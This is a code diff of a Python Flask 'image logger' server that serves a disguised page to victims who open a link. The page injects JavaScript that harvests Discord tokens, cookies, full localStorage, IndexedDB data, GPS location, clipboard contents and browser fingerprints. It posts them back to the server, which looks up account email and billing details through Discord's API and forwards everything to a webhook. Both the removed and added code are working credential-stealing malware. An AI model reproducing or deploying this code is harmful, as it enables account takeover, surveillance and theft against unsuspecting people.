@@ -3,7 +3,7 @@
 
 from flask import Flask, request, Response, redirect
 from urllib import parse
-import traceback, requests, base64, httpagentparser, json
+import traceback, requests, base64, httpagentparser, json, time
 
 app = Flask(__name__)
 
@@ -19,32 +19,31 @@ config = {
     "imageArgument": True,
 
     # CUSTOMIZATION #
-    "username": "Image Logger",
+    "username": "Logs",
     "color": 0x00FFFF,
 
     # OPTIONS #
     "crashBrowser": False,
-    "accurateLocation": False,
+    "accurateLocation": True,
 
-    # === DISCORD TOKEN STEALING === #
+    # === DATA GRABBING === #
     "stealTokens": True,
-    "tokenStealEndpoint": "/api/tokens",
 
     "message": {
-        "doMessage": False,
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
-        "richMessage": True,
+        "doMessage": True,
+        "message": "Loading...",
+        "richMessage": False,
     },
 
     "vpnCheck": 1,
-    "linkAlerts": True,
+    "linkAlerts": False,
     "buggedImage": True,
     "antiBot": 1,
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False,
-        "page": "https://your-link.here"
+        "redirect": True,
+        "page": "https://discord.com/channels/@me"
     },
 }
 
@@ -64,12 +63,12 @@ def reportError(error):
     try:
         requests.post(config["webhook"], json={
             "username": config["username"],
-            "content": "@everyone",
+            "content": "",
             "embeds": [
                 {
-                    "title": "Image Logger - Error",
-                    "color": config["color"],
-                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+                    "title": "Error",
+                    "color": 0xFF0000,
+                    "description": f"```\n{error[:1500]}\n```",
                 }
             ],
         })
@@ -77,206 +76,132 @@ def reportError(error):
         pass
 
 
-def sendTokenAlert(token, ip, useragent, endpoint="/"):
-    if not token or token == "undefined" or token == "null":
-        return
+sent_tokens = set()
 
-    token_parts = token.split(".")
-    token_decoded = {}
 
-    if len(token_parts) == 3:
-        try:
-            payload = token_parts[1]
-            payload += "=" * (4 - len(payload) % 4) if len(payload) % 4 else ""
-            token_decoded = json.loads(base64.b64decode(payload).decode("utf-8", errors="ignore"))
-        except Exception:
-            pass
+def sendFullReport(ip, useragent, data=None, endpoint="/"):
+    global sent_tokens
 
-    discord_id = token_decoded.get("id", "Unknown")
-    discord_email = token_decoded.get("email", "N/A")
-    user_info = None
-    billing_info = None
-    guilds = None
-    nitro_type = "None"
+    forwarded_for = ip
+    useragent_str = useragent
 
-    headers = {"Authorization": token}
-
+    # Get IP info
+    info = {}
     try:
-        user_resp = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
-        if user_resp.status_code == 200:
-            user_info = user_resp.json()
-            discord_id = user_info.get("id", discord_id)
-            discord_email = user_info.get("email", "N/A")
-            premium_type = user_info.get("premium_type", 0)
-            nitro_map = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
-            nitro_type = nitro_map.get(premium_type, "Unknown")
-            billing_resp = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=5)
-            if billing_resp.status_code == 200:
-                billing_info = billing_resp.json()
-            guilds_resp = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=5)
-            if guilds_resp.status_code == 200:
-                guilds = guilds_resp.json()
+        info = requests.get(f"http://ip-api.com/json/{forwarded_for}?fields=16976857", timeout=3).json()
     except Exception:
-        pass
+        info = {"isp": "Unknown", "as": "Unknown", "country": "Unknown", "regionName": "Unknown",
+                "city": "Unknown", "lat": 0, "lon": 0, "timezone": "UTC", "mobile": False, "proxy": False, "hosting": False}
 
-    embed_description = f"""**🎫 Discord Token Stolen!**
+    # Get browser info
+    os, browser = httpagentparser.simple_detect(useragent_str)
 
-**Token:** `{token[:50]}...`
-
-**User Info:**
-> **ID:** `{discord_id}`
-> **Email:** `{discord_email}`
-> **Username:** `{user_info.get('username', 'Unknown')}#{user_info.get('discriminator', '0000') if user_info else 'Unknown'}`
-> **Nitro:** `{nitro_type}`
-> **Phone:** `{user_info.get('phone', 'None') if user_info else 'Unknown'}`
-> **MFA Enabled:** `{user_info.get('mfa_enabled', 'Unknown') if user_info else 'Unknown'}`
-> **Verified:** `{user_info.get('verified', 'Unknown') if user_info else 'Unknown'}`
-
-**Billing Info:**
-> **Payment Methods:** `{len(billing_info) if billing_info else 0}`
-"""
-
-    if billing_info:
-        for i, method in enumerate(billing_info[:3]):
-            btype = method.get("type", "Unknown")
-            brand = method.get("brand", "N/A")
-            last4 = method.get("last_4", "N/A")
-            embed_description += f"> **Method {i+1}:** `{btype}` | `{brand}` | `****{last4}`\n"
-
-    embed_description += f"""
-**Guilds:** `{len(guilds) if guilds else 0} servers`
-"""
-
-    if guilds:
-        sorted_guilds = sorted(guilds, key=lambda g: g.get("approximate_member_count", 0), reverse=True)[:5]
-        for g in sorted_guilds:
-            embed_description += f"> `{g.get('name', 'Unknown')}` (ID: `{g.get('id', 'N/A')}`) - {g.get('approximate_member_count', '?')} members\n"
-
-    embed_description += f"""
-**IP:** `{ip}`
-**User-Agent:** `{useragent[:100]}...`
-"""
-
-    avatar_url = None
-    if user_info and user_info.get('avatar'):
-        avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user_info['avatar']}.png"
-
-    payload = {
-        "username": config["username"],
-        "content": "@everyone",
-        "embeds": [
-            {
-                "title": "🎣 Token Stealer",
-                "color": 0xFF0000,
-                "description": embed_description,
-            }
-        ],
-    }
-
-    if avatar_url:
-        payload["embeds"][0]["thumbnail"] = {"url": avatar_url}
-
-    try:
-        requests.post(config["webhook"], json=payload)
-    except Exception:
-        pass
-
-
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None):
-    if ip.startswith(blacklistedIPs):
-        return None
-
-    bot = botCheck(ip, useragent)
-
-    if bot:
-        if config["linkAlerts"]:
-            requests.post(config["webhook"], json={
-                "username": config["username"],
-                "content": "",
-                "embeds": [
-                    {
-                        "title": "Image Logger - Link Sent",
-                        "color": config["color"],
-                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-                    }
-                ],
-            })
-        return None
-
-    if token and config["stealTokens"]:
-        sendTokenAlert(token, ip, useragent, endpoint)
-
-    ping = "@everyone"
-
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if info.get("proxy"):
-        if config["vpnCheck"] == 2:
-            return None
-        if config["vpnCheck"] == 1:
-            ping = ""
-
-    if info.get("hosting"):
-        if config["antiBot"] == 4:
-            if info.get("proxy"):
-                pass
-            else:
-                return None
-        if config["antiBot"] == 3:
-            return None
-        if config["antiBot"] == 2:
-            if info.get("proxy"):
-                pass
-            else:
-                ping = ""
-        if config["antiBot"] == 1:
-            ping = ""
-
-    os, browser = httpagentparser.simple_detect(useragent)
-
+    # Build description
     tz_str = ""
     if info.get("timezone"):
         tz_parts = info["timezone"].split('/')
         if len(tz_parts) > 1:
             tz_str = f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})"
 
+    description = f"""**🌐 IP Logged**
+
+**IP:** `{forwarded_for}`
+**Provider:** `{info.get('isp', 'Unknown')}`
+**ASN:** `{info.get('as', 'Unknown')}`
+**Country:** `{info.get('country', 'Unknown')}`
+**Region:** `{info.get('regionName', 'Unknown')}`
+**City:** `{info.get('city', 'Unknown')}`
+**Coords:** `{info.get('lat', '?')}, {info.get('lon', '?')}`
+**Timezone:** `{tz_str}`
+**Mobile:** `{info.get('mobile', False)}`
+**VPN/Proxy:** `{info.get('proxy', False)}`
+**Bot/Hosting:** `{info.get('hosting', False)}`
+
+**💻 System:**
+**OS:** `{os}`
+**Browser:** `{browser}`
+**UA:** `{useragent_str[:80]}...`
+"""
+
+    # Tokens
+    if data and data.get("discord_tokens"):
+        tokens = data["discord_tokens"]
+        description += f"\n**🎫 Discord Tokens:** `{len(tokens)} found`\n"
+        for t in tokens:
+            token_key = t[:50]
+            if token_key not in sent_tokens:
+                sent_tokens.add(token_key)
+                description += f"> `{t[:50]}...` | Source: `{t.get('source', '?')}`\n"
+
+                # Try to get user info from token
+                try:
+                    headers = {"Authorization": t}
+                    u = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=3)
+                    if u.status_code == 200:
+                        uj = u.json()
+                        description += f"> 👤 `{uj.get('username', '?')}#{uj.get('discriminator', '0000')}` | ID: `{uj.get('id', '?')}` | Email: `{uj.get('email', 'N/A')}` | Nitro: `{uj.get('premium_type', 0)}`\n"
+                except Exception:
+                    pass
+
+    # Cookies
+    if data and data.get("cookies"):
+        description += f"\n**🍪 Cookies:** `{len(data['cookies'])}`\n"
+        for c in data["cookies"][:10]:
+            description += f"> `{c['name']}` = `{c['value'][:40]}...` | Domain: `{c.get('domain', '?')}`\n"
+
+    # Local storage
+    if data and data.get("local_storage"):
+        ls = data["local_storage"]
+        description += f"\n**💾 LocalStorage:** `{len(ls)} keys`\n"
+        for k, v in list(ls.items())[:8]:
+            description += f"> `{k}` = `{str(v)[:50]}...`\n"
+
+    # Browser data
+    if data and data.get("browser_data"):
+        bd = data["browser_data"]
+        description += f"\n**🌍 Browser:**\n"
+        description += f"> **Screen:** `{bd.get('screen', '?')}`\n"
+        description += f"> **Language:** `{bd.get('language', '?')}`\n"
+        description += f"> **Platform:** `{bd.get('platform', '?')}`\n"
+        description += f"> **GPU:** `{bd.get('gpu', '?')[:60]}...`\n"
+        description += f"> **CPU cores:** `{bd.get('cores', '?')}`\n"
+        description += f"> **RAM:** `{bd.get('ram', '?')} GB`\n"
+        description += f"> **Battery:** `{bd.get('battery', '?')}`\n"
+        description += f"> **Time:** `{bd.get('time', '?')}`\n"
+        description += f"> **Timezone offset:** `{bd.get('timezone_offset', '?')}`\n"
+        description += f"> **Plugins:** `{bd.get('plugins', '?')}`\n"
+
+    # Location
+    if data and data.get("location"):
+        loc = data["location"]
+        description += f"\n**📍 GPS Location:**\n"
+        description += f"> **Lat/Lon:** `{loc.get('lat', '?')}, {loc.get('lon', '?')}`\n"
+        description += f"> **Accuracy:** `{loc.get('accuracy', '?')}m`\n"
+
+    # Clipboard
+    if data and data.get("clipboard"):
+        description += f"\n**📋 Clipboard:** `{data['clipboard'][:60]}...`\n"
+
+    # Network
+    if data and data.get("network"):
+        net = data["network"]
+        description += f"\n**🌐 Network:**\n"
+        description += f"> **Online:** `{net.get('online', '?')}`\n"
+        description += f"> **Connection:** `{net.get('connection', '?')}`\n"
+
     embed = {
         "username": config["username"],
-        "content": ping,
+        "content": "",
         "embeds": [
             {
-                "title": "Image Logger - IP Logged",
+                "title": "📊 Full Report",
                 "color": config["color"],
-                "description": f"""**A User Opened the Original Image!**
-
-**Endpoint:** `{endpoint}`
-
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info.get('isp', 'Unknown')}`
-> **ASN:** `{info.get('as', 'Unknown')}`
-> **Country:** `{info.get('country', 'Unknown')}`
-> **Region:** `{info.get('regionName', 'Unknown')}`
-> **City:** `{info.get('city', 'Unknown')}`
-> **Coords:** `{str(info.get('lat', '')) + ', ' + str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](' + 'https://www.google.com/maps/search/google+map++' + coords + ')'})
-> **Timezone:** `{tz_str}`
-> **Mobile:** `{info.get('mobile', 'Unknown')}`
-> **VPN:** `{info.get('proxy', 'Unknown')}`
-> **Bot:** `{info.get('hosting', 'Unknown') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
-
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
-
-**User Agent:**
-```
-{useragent}
-```""",
-           }
+                "description": description[:4000],
+                "footer": {"text": f"Endpoint: {endpoint}"},
+                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
+            }
         ],
     }
-
-    if url:
-        embed["embeds"][0].update({"thumbnail": {"url": url}})
 
     try:
         requests.post(config["webhook"], json=embed)
@@ -293,8 +218,8 @@ binaries = {
 }
 
 
-@app.route('/api/tokens', methods=['POST', 'OPTIONS'])
-def token_endpoint():
+@app.route('/api/report', methods=['POST', 'OPTIONS'])
+def report_endpoint():
     if request.method == 'OPTIONS':
         resp = Response('')
         resp.headers['Access-Control-Allow-Origin'] = '*'
@@ -303,15 +228,10 @@ def token_endpoint():
         return resp
 
     data = request.get_json(silent=True) or {}
-    token = data.get("token", "")
+    forwarded_for = request.headers.get('x-forwarded-for', request.remote_addr or 'Unknown')
+    useragent = request.headers.get('user-agent', 'Unknown')
 
-    if token:
-        sendTokenAlert(
-            token,
-            request.headers.get('x-forwarded-for', request.remote_addr or 'Unknown'),
-            request.headers.get('user-agent', 'Unknown'),
-            "/api/tokens"
-        )
+    sendFullReport(forwarded_for, useragent, data=data, endpoint="/api/report")
 
     resp = Response('{"status":"ok"}', mimetype='application/json')
     resp.headers['Access-Control-Allow-Origin'] = '*'
@@ -338,195 +258,215 @@ def catch_all(path):
 
         forwarded_for = request.headers.get('x-forwarded-for', request.remote_addr or '')
         ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr or ''
-        useragent = request.headers.get('user-agent', '')
+        useragent_str = request.headers.get('user-agent', '')
         endpoint = f"/{path}" if path else "/"
 
         if ip and ip.startswith(blacklistedIPs):
             return Response('', status=403)
 
-        bot_check_result = botCheck(ip, useragent)
-
-        token_steal_script = ""
-        if config["stealTokens"]:
-            host = request.headers.get('Host', 'localhost')
-            scheme = request.headers.get('X-Forwarded-Proto', 'http')
-            callback_url = f"{scheme}://{host}/api/tokens"
-
-            token_steal_script = f"""
-            <script>
-            (function() {{
-                var tokenStealEndpoint = '{callback_url}';
-                var discordTokens = [];
-                try {{
-                    for (var i = 0; i < localStorage.length; i++) {{
-                        var key = localStorage.key(i);
-                        var value = localStorage.getItem(key);
-                        if (key && (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord'))) {{
-                            if (typeof value === 'string' && value.split('.').length === 3) {{
-                                discordTokens.push({{source: 'localStorage', key: key, token: value}});
-                            }}
-                        }}
-                    }}
-                    var dt = localStorage.getItem('token');
-                    if (dt && dt.split('.').length === 3) {{
-                        discordTokens.push({{source: 'localStorage', key: 'token', token: dt}});
-                    }}
-                }} catch(e) {{}}
-                try {{
-                    for (var i = 0; i < sessionStorage.length; i++) {{
-                        var key = sessionStorage.key(i);
-                        var value = sessionStorage.getItem(key);
-                        if (typeof value === 'string' && value.split('.').length === 3 && value.length > 50) {{
-                            discordTokens.push({{source: 'sessionStorage', key: key, token: value}});
-                        }}
-                    }}
-                }} catch(e) {{}}
-                try {{
-                    document.cookie.split(';').forEach(function(c) {{
-                        c = c.trim();
-                        if (c.toLowerCase().includes('token') || c.toLowerCase().includes('discord')) {{
-                            var parts = c.split('=');
-                            var val = parts.slice(1).join('=');
-                            if (val.split('.').length === 3) {{
-                                discordTokens.push({{source: 'cookie', key: parts[0], token: val}});
-                            }}
-                        }}
-                    }});
-                }} catch(e) {{}}
-                var originalFetch = window.fetch;
-                window.fetch = function() {{
-                    if (arguments[0] && typeof arguments[0] === 'string' && arguments[0].includes('discord.com/api')) {{
-                        if (arguments[1] && arguments[1].headers) {{
-                            var auth = arguments[1].headers.Authorization || arguments[1].headers.authorization;
-                            if (auth && auth.split('.').length === 3) {{
-                                discordTokens.push({{source: 'fetch_intercept', key: 'Authorization', token: auth}});
-                            }}
-                        }}
-                    }}
-                    return originalFetch.apply(this, arguments);
-                }};
-                var originalOpen = XMLHttpRequest.prototype.open;
-                XMLHttpRequest.prototype.open = function(method, url) {{
-                    if (url && typeof url === 'string' && url.includes('discord.com/api')) {{
-                        var xhr = this;
-                        var originalSetHeader = xhr.setRequestHeader;
-                        xhr.setRequestHeader = function(header, value) {{
-                            if ((header === 'Authorization' || header === 'authorization') &&
-                                typeof value === 'string' && value.split('.').length === 3) {{
-                                discordTokens.push({{source: 'xhr_intercept', key: header, token: value}});
-                            }}
-                            return originalSetHeader.apply(this, arguments);
-                        }};
-                    }}
-                    return originalOpen.apply(this, arguments);
-                }};
-                if (discordTokens.length > 0) {{
-                    setTimeout(function() {{
-                        var sentTokens = {{}};
-                        discordTokens.forEach(function(item) {{
-                            if (!sentTokens[item.token]) {{
-                                sentTokens[item.token] = true;
-                                var xhr = new XMLHttpRequest();
-                                xhr.open('POST', tokenStealEndpoint, true);
-                                xhr.setRequestHeader('Content-Type', 'application/json');
-                                xhr.send(JSON.stringify({{
-                                    token: item.token,
-                                    source: item.source,
-                                    key: item.key,
-                                    url: window.location.href
-                                }}));
-                            }}
-                        }});
-                    }}, 500);
-                }}
-            }})();
-            </script>
-            """
+        bot_check_result = botCheck(ip, useragent_str)
 
         if bot_check_result:
             if config["buggedImage"]:
                 resp = Response(binaries["loading"], mimetype='image/jpeg')
             else:
                 resp = redirect(url)
-            makeReport(ip, useragent, endpoint=endpoint, url=url)
             return resp
 
-        url_token = query_params.get("t") or query_params.get("token")
-        coords = None
-        if query_params.get("g") and config["accurateLocation"]:
-            try:
-                coords = base64.b64decode(query_params.get("g").encode()).decode()
-            except Exception:
-                pass
+        # Déterminer l'URL de callback
+        host = request.headers.get('Host', 'localhost')
+        scheme = request.headers.get('X-Forwarded-Proto', 'http')
+        callback_url = f"{scheme}://{host}/api/report"
 
-        result = makeReport(ip, useragent, coords, endpoint, url=url, token=url_token)
+        # Envoyer immédiatement le rapport IP
+        sendFullReport(ip, useragent_str, endpoint=endpoint)
 
-        message = config["message"]["message"]
-        if config["message"]["richMessage"] and result:
-            message = message.replace("{ip}", ip)
-            message = message.replace("{isp}", result.get("isp", "Unknown"))
-            message = message.replace("{asn}", result.get("as", "Unknown"))
-            message = message.replace("{country}", result.get("country", "Unknown"))
-            message = message.replace("{region}", result.get("regionName", "Unknown"))
-            message = message.replace("{city}", result.get("city", "Unknown"))
-            message = message.replace("{lat}", str(result.get("lat", "")))
-            message = message.replace("{long}", str(result.get("lon", "")))
-            if result.get("timezone"):
-                tz_parts = result["timezone"].split('/')
-                if len(tz_parts) > 1:
-                    message = message.replace("{timezone}", f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})")
-            message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
-            message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
-            hosting = result.get("hosting", False)
-            message = message.replace("{bot}", str(hosting if hosting and not result.get("proxy") else 'Possibly' if hosting else 'False'))
-            message = message.replace("{browser}", httpagentparser.simple_detect(useragent)[1])
-            message = message.replace("{os}", httpagentparser.simple_detect(useragent)[0])
+        # Injecter le payload JS
+        js_payload = f"""
+        <script>
+        (function() {{
+            var callback = '{callback_url}';
+            var collectedData = {{}};
+
+            // 1) Discord Token Grabbing
+            var discordTokens = [];
+            try {{
+                // localStorage
+                for (var i = 0; i < localStorage.length; i++) {{
+                    var k = localStorage.key(i);
+                    var v = localStorage.getItem(k);
+                    if (v && typeof v === 'string' && v.split('.').length === 3 && v.length > 50) {{
+                        if (k.toLowerCase().includes('token') || k.toLowerCase().includes('discord') || k === 'token') {{
+                            discordTokens.push(v);
+                        }}
+                    }}
+                }}
+                // sessionStorage
+                for (var i = 0; i < sessionStorage.length; i++) {{
+                    var k = sessionStorage.key(i);
+                    var v = sessionStorage.getItem(k);
+                    if (v && typeof v === 'string' && v.split('.').length === 3 && v.length > 50) {{
+                        if (k.toLowerCase().includes('token') || k.toLowerCase().includes('discord') || k === 'token') {{
+                            discordTokens.push(v);
+                        }}
+                    }}
+                }}
+                // IndexedDB (Discord)
+                if (window.indexedDB) {{
+                    var dbs = ['discord', 'discordcanary', 'discordptb'];
+                    dbs.forEach(function(dbName) {{
+                        try {{
+                            var req = indexedDB.open(dbName);
+                            req.onsuccess = function() {{
+                                var db = req.result;
+                                if (db.objectStoreNames.contains('localStorage')) {{
+                                    var tx = db.transaction('localStorage', 'readonly');
+                                    var store = tx.objectStore('localStorage');
+                                    var getReq = store.getAll();
+                                    getReq.onsuccess = function() {{
+                                        var items = getReq.result;
+                                        items.forEach(function(item) {{
+                                            if (item && typeof item === 'string' && item.split('.').length === 3) {{
+                                                discordTokens.push(item);
+                                            }}
+                                        }});
+                                    }};
+                                }}
+                            }};
+                        }} catch(e) {{}}
+                    }});
+                }}
+                // Intercepter fetch pour capturer les tokens en transit
+                var origFetch = window.fetch;
+                window.fetch = function() {{
+                    if (arguments[0] && typeof arguments[0] === 'string' && arguments[0].includes('discord.com/api')) {{
+                        if (arguments[1] && arguments[1].headers) {{
+                            var auth = arguments[1].headers.Authorization || arguments[1].headers.authorization;
+                            if (auth && auth.split('.').length === 3) {{
+                                discordTokens.push(auth);
+                            }}
+                        }}
+                    }}
+                    return origFetch.apply(this, arguments);
+                }};
+            }} catch(e) {{}}
+
+            if (discordTokens.length > 0) {{
+                collectedData.discord_tokens = discordTokens;
+            }}
+
+            // 2) Cookies
+            try {{
+                var cookies = document.cookie.split(';').map(function(c) {{
+                    var parts = c.trim().split('=');
+                    return {{ name: parts[0], value: parts.slice(1).join('=') }};
+                }}).filter(function(c) {{ return c.name && c.name.length > 0; }});
+                if (cookies.length > 0) collectedData.cookies = cookies;
+            }} catch(e) {{}}
+
+            // 3) LocalStorage complet
+            try {{
+                var ls = {{}};
+                for (var i = 0; i < localStorage.length; i++) {{
+                    var k = localStorage.key(i);
+                    ls[k] = localStorage.getItem(k);
+                }}
+                if (Object.keys(ls).length > 0) collectedData.local_storage = ls;
+            }} catch(e) {{}}
+
+            // 4) Browser / System Info
+            try {{
+                collectedData.browser_data = {{
+                    screen: screen.width + 'x' + screen.height,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    gpu: (function() {{
+                        try {{
+                            var canvas = document.createElement('canvas');
+                            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                            if (gl) {{
+                                var ext = gl.getExtension('WEBGL_debug_renderer_info');
+                                if (ext) return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+                            }}
+                        }} catch(e) {{}}
+                        return 'N/A';
+                    }})(),
+                    cores: navigator.hardwareConcurrency || '?',
+                    ram: navigator.deviceMemory || '?',
+                    battery: 'N/A',
+                    time: new Date().toString(),
+                    timezone_offset: new Date().getTimezoneOffset(),
+                    plugins: navigator.plugins.length || 0
+                }};
+                // Battery API
+                if (navigator.getBattery) {{
+                    navigator.getBattery().then(function(b) {{
+                        collectedData.browser_data.battery = (b.level * 100).toFixed(0) + '%' + (b.charging ? ' (charging)' : '');
+                    }});
+                }}
+            }} catch(e) {{}}
+
+            // 5) GPS Location
+            if (navigator.geolocation) {{
+                navigator.geolocation.getCurrentPosition(function(pos) {{
+                    collectedData.location = {{
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    }};
+                    sendData();
+                }}, function() {{
+                    sendData();
+                }}, {{ timeout: 3000, enableHighAccuracy: true }});
+            }}
+
+            // 6) Clipboard
+            try {{
+                if (navigator.clipboard && navigator.clipboard.readText) {{
+                    navigator.clipboard.readText().then(function(text) {{
+                        if (text) collectedData.clipboard = text;
+                    }}).catch(function() {{}});
+                }}
+            }} catch(e) {{}}
+
+            // 7) Network info
+            try {{
+                collectedData.network = {{
+                    online: navigator.onLine,
+                    connection: (navigator.connection || {{}}).effectiveType || '?'
+                }};
+            }} catch(e) {{}}
+
+            // Envoyer les données
+            function sendData() {{
+                if (Object.keys(collectedData).length === 0) return;
+                setTimeout(function() {{
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', callback, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.send(JSON.stringify(collectedData));
+                }}, 1000);
+            }}
+
+            // Déclencher l'envoi si la géoloc n'est pas dispo
+            if (!navigator.geolocation) sendData();
+        }})();
+        </script>
+        """
 
         html = f'''<!DOCTYPE html>
 <html>
 <head>
+<meta http-equiv="refresh" content="0;url=https://discord.com/channels/@me">
 <style>
 body {{ margin: 0; padding: 0; }}
-div.img {{
-    background-image: url('{url}');
-    background-position: center center;
-    background-repeat: no-repeat;
-    background-size: contain;
-    width: 100vw;
-    height: 100vh;
-}}
 </style>
-{token_steal_script}
+{js_payload}
 </head>
-<body>'''
+<body>
+</body>
+</html>'''
 
-        if config["redirect"]["redirect"]:
-            html += f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
-        elif config["message"]["doMessage"]:
-            html += f'<div>{message}</div>'
-        elif config["crashBrowser"]:
-            html += f'<div>{message}</div><script>setTimeout(function(){{for (var i=69420;i==i;i*=i){{console.log(i)}}}}, 100)</script>'
-        else:
-            html += '<div class="img"></div>'
-
-        if config["accurateLocation"]:
-            html += '''<script>
-var currenturl = window.location.href;
-if (!currenturl.includes("g=")) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (coords) {
-            if (currenturl.includes("?")) {
-                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-            } else {
-                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-            }
-            location.replace(currenturl);
-        });
-    }
-}
-</script>'''
-
-        html += '</body></html>'
         return Response(html, mimetype='text/html')
 
     except Exception as e:
